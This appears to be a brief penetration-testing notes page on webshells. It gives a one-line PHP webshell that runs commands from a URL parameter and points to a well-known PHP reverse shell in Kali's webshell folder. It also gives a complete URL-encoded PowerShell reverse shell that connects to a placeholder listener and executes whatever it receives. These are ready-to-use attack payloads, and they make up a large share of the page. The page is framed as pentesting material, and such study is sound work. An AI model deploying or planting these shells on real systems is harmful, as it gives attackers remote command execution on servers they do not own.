# WebShells

### What is a Webshell?

A webshell is a script (often in PHP or ASP) that runs on a web server, allowing users to execute commands remotely through a web interface. It serves as a useful tool for gaining access to a server when direct methods like reverse or bind shells are not possible.

### How Webshells Work

Webshells accept commands via URL parameters or HTML forms, executing them on the server and returning the results. This can help bypass firewalls and security measures.

#### Basic Example

A simple PHP webshell can be written as:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

This allows commands to be executed by appending `?cmd=` to the URL.

### Available Webshells

Kali Linux includes various webshells in `/usr/share/webshells`, such as the [PentestMonkey PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), which is designed for Unix-based systems.

### Remote Code Execution on Windows

For Windows targets, RCE can often be achieved using a URL-encoded PowerShell reverse shell. This can be included in the URL as a command parameter.

#### Example Command

{% code overflow="wrap" %}
```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

```
{% endcode %}

Replace `<IP>` and `<PORT>` with your listener's details.

### Conclusion

Webshells are effective for executing commands on web servers, making them valuable for penetration testing. Always use these techniques ethically and responsibly.
